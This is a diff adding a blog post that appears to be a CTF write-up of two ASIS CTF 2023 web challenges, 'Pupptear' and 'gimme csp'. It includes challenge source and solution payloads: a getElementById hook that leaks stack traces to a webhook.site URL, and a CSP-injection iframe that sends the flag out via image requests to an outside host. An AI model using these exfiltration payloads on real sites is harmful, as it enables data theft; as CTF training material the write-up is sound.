@@ -167,6 +167,132 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://chensonghi.github.io./2023/12/25/ASISCTF/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/ch.jpg">
+      <meta itemprop="name" content="chleynx">
+      <meta itemprop="description" content="不是看到希望才坚持，而是坚持了才能看到希望">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="星河风">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/12/25/ASISCTF/" class="post-title-link" itemprop="url">ASISCTF</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-12-25 00:22:51" itemprop="dateCreated datePublished" datetime="2023-12-25T00:22:51+08:00">2023-12-25</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2024-02-05 00:25:27" itemprop="dateModified" datetime="2024-02-05T00:25:27+08:00">2024-02-05</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/challenge/" itemprop="url" rel="index"><span itemprop="name">challenge</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="Pupptear"><a href="#Pupptear" class="headerlink" title="Pupptear:"></a><strong>Pupptear:</strong></h2><p>***报错追踪文件名字</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Do you know what Puppeteer&#x27;s friends call him when he cries? Pupptear... hahahaah</span><br><span class="line"></span><br><span class="line">[attachment](&lt;https://asisctf.com/tasks/pupptear_0ab53ea3b73da58a4d0854bf42ec1ea166283b3e.txz&gt;)</span><br><span class="line"></span><br><span class="line">nc 18.195.96.13 2000</span><br><span class="line"></span><br><span class="line">Flag format for Pupptear: ^ASIS&#123;[^&#123;&#125;]+&#125;$</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://prod-files-secure.s3.us-west-2.amazonaws.com/c378b070-6063-4137-81ee-f75f82009b81/7865afae-5d80-486d-b9d3-9239e8b4ff5e/pupptear.txz">pupptear.txz</a></p>
+<p>oh ok</p>
+<p>I get the concept.</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">url = <span class="title function_">input</span>(<span class="string">&#x27;input URL (b64ed): &#x27;</span>)</span><br><span class="line"><span class="keyword">if</span>(not re.<span class="title function_">match</span>(<span class="string">&#x27;^[A-Za-z0-9=+/]+$&#x27;</span>,url)):</span><br><span class="line">	<span class="title function_">print</span>(<span class="string">&#x27;bad URL&#x27;</span>)</span><br><span class="line">	<span class="title function_">exit</span>(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">os.<span class="title function_">close</span>(<span class="number">0</span>)</span><br><span class="line">os.<span class="title function_">close</span>(<span class="number">1</span>)</span><br><span class="line">os.<span class="title function_">close</span>(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">containerName = <span class="string">&#x27;&#x27;</span>.<span class="title function_">join</span>(random.<span class="title function_">choice</span>(string.<span class="property">ascii_uppercase</span> + string.<span class="property">digits</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="title function_">range</span>(<span class="number">0x10</span>))</span><br><span class="line">os.<span class="title function_">system</span>(f<span class="string">&#x27;bash -c &quot;sleep 5 &amp;&amp; docker kill &#123;containerName&#125; 2&gt;/dev/null&quot; &amp;&#x27;</span>)</span><br><span class="line">os.<span class="title function_">system</span>(f<span class="string">&#x27;docker run --name &#123;containerName&#125; pupptear bash -c \\&#x27;</span>/<span class="variable constant_">ASIS</span>*/index.<span class="property">js</span> &#123;url&#125;\\<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">#!<span class="regexp">/usr/</span>bin/env node</span><br><span class="line"><span class="keyword">const</span> puppeteer = <span class="built_in">require</span>(<span class="string">&#x27;puppeteer&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> flag = <span class="string">&#x27;flag&#123;test-flag&#125;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">visit</span>(<span class="params">url</span>)&#123;</span><br><span class="line">	<span class="keyword">let</span> browser;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(!<span class="regexp">/^https?:\\/</span>\\<span class="comment">//.test(url))&#123;</span></span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">try</span>&#123;</span><br><span class="line">		browser = <span class="keyword">await</span> puppeteer.<span class="title function_">launch</span>(&#123;</span><br><span class="line">		    <span class="attr">pipe</span>: <span class="literal">true</span>,</span><br><span class="line">		    <span class="attr">args</span>: [</span><br><span class="line">		        <span class="string">&quot;--no-sandbox&quot;</span>,</span><br><span class="line">		        <span class="string">&quot;--disable-setuid-sandbox&quot;</span>,</span><br><span class="line">		        <span class="string">&quot;--js-flags=--noexpose_wasm,--jitless&quot;</span>,</span><br><span class="line">		        <span class="string">&quot;--ignore-certificate-errors&quot;</span>,</span><br><span class="line">		    ],</span><br><span class="line">		    <span class="attr">executablePath</span>: <span class="string">&quot;/usr/bin/google-chrome-stable&quot;</span>,</span><br><span class="line">		    <span class="attr">headless</span>: <span class="string">&#x27;new&#x27;</span></span><br><span class="line">		&#125;);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">let</span> page = <span class="keyword">await</span> browser.<span class="title function_">newPage</span>();</span><br><span class="line">		<span class="keyword">await</span> page.<span class="title function_">goto</span>(url,&#123; <span class="attr">timeout</span>: <span class="number">2000</span> &#125;);</span><br><span class="line">		<span class="keyword">await</span> page.<span class="title function_">waitForFunction</span>(<span class="function"><span class="params">flag</span>=&gt;</span>&#123;</span><br><span class="line">			<span class="keyword">let</span> el = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;flag&#x27;</span>)</span><br><span class="line">			<span class="keyword">if</span>(!el) <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">			el.<span class="property">value</span> = flag</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">		&#125;,&#123; <span class="attr">timeout</span>: <span class="number">2000</span> &#125;,flag)</span><br><span class="line">		<span class="keyword">await</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function"><span class="params">r</span>=&gt;</span><span class="built_in">setTimeout</span>(r,<span class="number">3000</span>));</span><br><span class="line">	&#125;<span class="keyword">catch</span>(e)&#123;&#125;</span><br><span class="line">	<span class="keyword">try</span>&#123;<span class="keyword">await</span> browser.<span class="title function_">close</span>();&#125;<span class="keyword">catch</span>(e)&#123;&#125;</span><br><span class="line">	process.<span class="title function_">exit</span>(<span class="number">0</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>get folder name? have no idea.</p>
+<p>need to check if we can get flag during page move delay<img src="/2023/12/25/ASISCTF/image-20240101163004369-1707063823030-1.png" alt="image-20240101163004369"></p>
+<p>fake flag. need to get folder name. i guess stacktrace from waitforfunction?</p>
+<figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /app</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./stuff/ /app/</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> PUPPETEER_SKIP_DOWNLOAD=1 npm ci</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> +x /app/index.js</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> useradd -m www</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> 777 /home/www/ -R</span></span><br><span class="line"><span class="keyword">ENV</span> FLAG=ASIS&#123;test-flag&#125;</span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">mv</span> /app/ /<span class="variable">$FLAG</span>/</span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /</span></span><br><span class="line"><span class="keyword">USER</span> www</span><br></pre></td></tr></table></figure>
+
+<p>I guess yes.</p>
+<p>One way is to hook <code>Error</code> and find filename, but I have to install puppeteer for testing. I don’t know how things work internally for puppeteer😕</p>
+<p>If no one solves it I will try out sometime tomorrow.</p>
+<p>i dont know either. ppt is heavily coupled with chrome devtools, i guess the function execution is a part of devtools protocol.</p>
+<p>hook getElementById, read stacktrace.</p>
+<p>solved:</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;flag&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> oldFunc = <span class="variable language_">document</span>.<span class="property">getElementById</span></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="property">getElementById</span> = <span class="keyword">function</span>(<span class="params">id</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">const</span> e = <span class="keyword">new</span> <span class="title class_">Error</span>();</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">const</span> stack = e.<span class="property">stack</span>.<span class="title function_">split</span>(<span class="string">&#x27;\\n&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">      <span class="title function_">fetch</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">document</span>.location.href&#125;</span>`</span>, &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">headers</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span></span></span><br><span class="line"><span class="language-javascript">        &#125;,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">          id,</span></span><br><span class="line"><span class="language-javascript">          stack</span></span><br><span class="line"><span class="language-javascript">        &#125;)</span></span><br><span class="line"><span class="language-javascript">      &#125;)</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">return</span> oldFunc.<span class="title function_">apply</span>(<span class="variable language_">document</span>, <span class="variable language_">arguments</span>)</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>or</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">const HOOK_URL = &quot;https://webhook.site/ae22bc03-bb75-4080-9702-36cbb57cc53d&quot;;</span><br><span class="line"></span><br><span class="line">let sent = false;</span><br><span class="line">function hook() &#123;</span><br><span class="line">  if (sent) return;</span><br><span class="line">  sent = true;</span><br><span class="line"></span><br><span class="line">  const e = new Error();</span><br><span class="line">  navigator.sendBeacon(HOOK_URL, e.stack);</span><br><span class="line">&#125;</span><br><span class="line">document.getElementById = hook;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/12/25/ASISCTF/image-20240101162824320-1707063823030-2.png" alt="image-20240101162824320"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Error</span><br><span class="line">    at HTMLDocument.hook [as getElementById] (http://47.108.69.229/?id&#123;aaa111&#125;:11:13)</span><br><span class="line">    at eval (eval at G (:3:1641), &lt;anonymous&gt;:4:22)</span><br><span class="line">    at P.&lt;anonymous&gt; (pptr:evaluateHandle;WaitTask.rerun (/ASIS&#123;d1d-y0u-m4k3-pupp733r-cry-4n-3rr0r-6u35f5&#125;/node_modules/puppeteer-core/lib/cjs/puppeteer/common/WaitTask.js:80:54):4:36)</span><br><span class="line">    at P.start (pptr:internal:3:3734)</span><br><span class="line">    at pptr:evaluate;WaitTask.rerun (/ASIS&#123;d1d-y0u-m4k3-pupp733r-cry-4n-3rr0r-6u35f5&#125;/node_modules/puppeteer-core/lib/cjs/puppeteer/common/WaitTask.js:110:32):2:29</span><br></pre></td></tr></table></figure>
+
+<p>ASIS{d1d-y0u-m4k3-pupp733r-cry-4n-3rr0r-6u35f5}</p>
+<h2 id="gimme-csp-warmup"><a href="#gimme-csp-warmup" class="headerlink" title="gimme csp(warmup):"></a><strong>gimme csp(warmup):</strong></h2><p>绕过csp——-iframe标签</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">hint for beginners: read about CSPs and Iframes and what features they can offer that you can use to bypass or exfiltrate things. The challenge isn&#x27;t easy if you are new to CTFs or don&#x27;t have much experience however it should be the easiest web challenge.</span><br><span class="line"></span><br><span class="line">[attachment](&lt;https://asisctf.com/tasks/gimme-csp_2b4abfa898695e4a37f7f36e4ba1b35a88f37103.txz&gt;)</span><br><span class="line"></span><br><span class="line">website: &lt;https://gimmecsp.asisctf.com&gt;</span><br><span class="line">Admin bot: &lt;http://18.195.96.13:8001&gt;</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://prod-files-secure.s3.us-west-2.amazonaws.com/c378b070-6063-4137-81ee-f75f82009b81/afec582d-a963-4f8b-9bbb-a140d32e55dc/gimme-csp.txz">gimme-csp.txz</a></p>
+<p>ok</p>
+<p>I can solve</p>
+<p>server returned multiple csp header and only the default-src ‘none’ works</p>
+<p>one last step…</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=<span class="string">&quot;&lt;https://gimmecsp.asisctf.com/?letter=$gift$&gt;&lt;/pre&gt;1234&lt;link rel=&#x27;stylesheet&#x27; href=&#x27;//fe.gy/1.css&#x27;&gt;&lt;/script&gt;&quot;</span> csp=<span class="string">&quot;stylescript-src-src-elem &#x27;self&#x27; &#x27;unsafe-eval&#x27; &lt;https://fe.gy&gt; &#x27;unsafe-inline&#x27;;&quot;</span>  referrerpolicy=<span class="string">&quot;no-referrer&quot;</span>&gt;&lt;<span class="regexp">/iframe&gt;&lt;/</span>body&gt;</span><br></pre></td></tr></table></figure>
+
+<p>oh</p>
+<p>got an idea 🙂</p>
+<p>I think the <code>csp</code> attribute does some sort of sandboxing, we need to find some good way to prefetch or load the flag</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=<span class="string">&quot;&lt;https://gimmecsp.asisctf.com/?letter=&gt;&lt;/pre&gt;1234&lt;img src=&#x27;&lt;https://fe.gy/$gift$&gt;&#x27;&gt;&lt;/script&gt;&quot;</span> csp=<span class="string">&quot;img-src &lt;https://fe.gy&gt;; defascript-srcult-sscript-srcrc &lt;https://fe.gy&gt;; repscript-srcort-uscript-srcri &lt;https://fe.gy&gt;;&quot;</span> referrerpolicy=<span class="string">&quot;no-referrer&quot;</span>&gt;&lt;<span class="regexp">/iframe&gt;&lt;/</span>body&gt;</span><br></pre></td></tr></table></figure>
+
+<p>ok</p>
+<p>I think I can get flag now?</p>
+<p>Here’s a way</p>
+<p>solved now</p>
+<p>exploit:</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=<span class="string">&quot;&lt;https://gimmecsp.asisctf.com/?letter=&gt;&lt;/pre&gt;1234&lt;img src=&#x27;&lt;http://$gift$.harold.kim:1337/&gt;&#x27;&gt;&lt;/script&gt;&quot;</span> csp=<span class="string">&quot;img-src https://*; defascript-srcult-sscript-srcrc &lt;http://harold.kim:1337/&gt;; repscript-srcort-uscript-srcri &lt;https://azusawa.world/a.php;&quot;</span>&gt; referrerpolicy=<span class="string">&quot;no-referrer&quot;</span>&gt;&lt;<span class="regexp">/iframe&gt;&lt;/</span>body&gt;</span><br><span class="line">&#123;<span class="string">&quot;csp-report&quot;</span>:&#123;<span class="string">&quot;document-uri&quot;</span>:<span class="string">&quot;[&lt;https://gimmecsp.asisctf.com/?letter=&gt;&lt;/pre&gt;1234&lt;img src=&#x27;&lt;http://$gift$.harold.kim:1337/&gt;&#x27;&gt;&lt;/script&gt;&quot;</span>,<span class="string">&quot;referrer&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;violated-directive&quot;</span>:<span class="string">&quot;img-src&quot;</span>,<span class="string">&quot;effective-directive&quot;</span>:<span class="string">&quot;img-src&quot;</span>,<span class="string">&quot;original-policy&quot;</span>:<span class="string">&quot;img-src](&lt;https://gimmecsp.asisctf.com/?letter=%3C/pre%3E1234%3Cimg%20src=%27http://$gift$.harold.kim:1337/%27%3E%3C/script%3E%22,%22referrer%22:%22%22,%22violated-directive%22:%22img-src%22,%22effective-directive%22:%22img-src%22,%22original-policy%22:%22img-src&gt;) https://*; default-src &lt;http://harold.kim:1337/&gt;; report-uri [&lt;https://azusawa.world/a.php;&quot;</span>,<span class="string">&quot;disposition&quot;</span>:<span class="string">&quot;enforce&quot;</span>,<span class="string">&quot;blocked-uri&quot;</span>:<span class="string">&quot;https://asis&#123;test-flag&#125;.harold.kim:1337/&quot;</span>,<span class="string">&quot;line-number&quot;</span>:<span class="number">1</span>,<span class="string">&quot;source-file&quot;</span>:<span class="string">&quot;https://gimmecsp.asisctf.com/&quot;</span>,<span class="string">&quot;status-code&quot;</span>:<span class="number">200</span>,<span class="string">&quot;script-sample&quot;</span>:<span class="string">&quot;&gt;](&lt;https://azusawa.world/a.php;%22,%22disposition%22:%22enforce%22,%22blocked-uri%22:%22https://asis%7Btest-flag%7D.harold.kim:1337/%22,%22line-number%22:1,%22source-file%22:%22https://gimmecsp.asisctf.com/%22,%22status-code%22:200,%22script-sample%22:%22&gt;)&quot;</span>&#125;&#125;<span class="string">``</span><span class="string">`</span></span><br></pre></td></tr></table></figure>
+
+<p>ASIS{1m-n07-r34dy-f0r-2024-y3t-dfadb}</p>
+
+      
+    </div>
+
+    
+    
+    
+	
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://chensonghi.github.io./2023/10/20/SQL%E6%B3%A8%E5%85%A5/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1319,7 +1445,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">13</span>
+          <span class="site-state-item-count">14</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
